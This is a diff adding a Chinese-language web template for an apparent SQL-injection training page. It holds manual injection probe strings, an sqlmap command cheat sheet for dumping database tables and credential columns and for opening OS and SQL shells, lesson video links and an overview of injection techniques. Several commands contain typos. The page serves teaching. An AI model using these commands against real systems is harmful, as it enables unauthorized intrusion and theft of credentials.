@@ -1,0 +1,76 @@
+{% extends 'homepage.html' %}
+
+{% block container %}
+<script>
+
+</script>
+<div class="row">
+	<div class="col-md-9">
+		<!-- BOX -->
+		<div class="box border blue">
+			<div class="box-title">
+				<h4><i class="fa fa-quote-left"></i>常用命令</h4>
+			</div>
+			<div class="box-body font-400">
+				<h3>常用命令</h3>
+				
+				<p>首先手动判断是否存在注入点 ' and '1'='1 #+  和' and '1'='2 #+会出现两个不同的界面</p>			
+				<p>sqlmap.py -u “http://www.***.com/index.php?id=1*”</p>
+				<p>sqlmap.py --forms “http://www.***.com/login.aspx”</p>
+				<p>sqlmap.py -u -url --current-db</p>
+				<p>sqlmap.py -u -url --current-user</p>
+				<p>sqlmap.py -u -url --dbs</p>
+				<p>sqlmap.py -u -url -D “db_name” --tabels</p>
+				<p>sqlmap.py -u -url -D “db_name” -T “table_name” --column</p>
+				<p>sqlmap.py -u -url -D “db_name” -T “table_name” -C “password.username” --dump</p>
+				<p>sqlmap.py -u -url --os-shell</p>
+				<p>sqlmap.py -u -url --sql-shell</p>
+				<p>sqlmap.py -u -url --all</p>		
+				
+				<h3>实操视频</h3>
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson1')  }}">Lesson1(GET-Erro based -Single quotes-String)</a>
+				</p>
+
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson2')  }}">Lesson2(GET-Erro based -Intiger based)</a>
+				</p>
+				
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson3')  }}">Lesson3(GET-Erro based -Single quotes with twist-String)</a>
+				</p>
+				
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson4')  }}">Lesson4(GET-Erro based Double quotes-String)</a>
+				</p>
+				
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson5')  }}">Lesson5(GET-Double Injection -Single quotes-String)</a>
+				</p>
+
+				<p>
+					<a href="{{  url_for('demovideo',le='Lesson6')  }}">Lesson6(GET-Double Injection -Double quotes-String)</a>
+				</p>
+				
+			
+			</div>			
+		</div>
+	</div>
+	<div class="col-md-3">
+		<!-- BOX -->
+		<div class="box">
+			<div class="box-title">
+				<h4><i class="fa fa-quote-left"></i>工具介绍</h4>
+			</div>
+			<div class="box-body font-400">
+				<p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p>
+				<p>	1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>  
+				<p>	2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。  </p>
+				<p>3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p>
+				<p>4）联合查询注入，可以使用union的情况下的注入。 </p>	
+				<p>	5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+			</div>
+		</div>
+	</div>
+</div>
+{% endblock %}
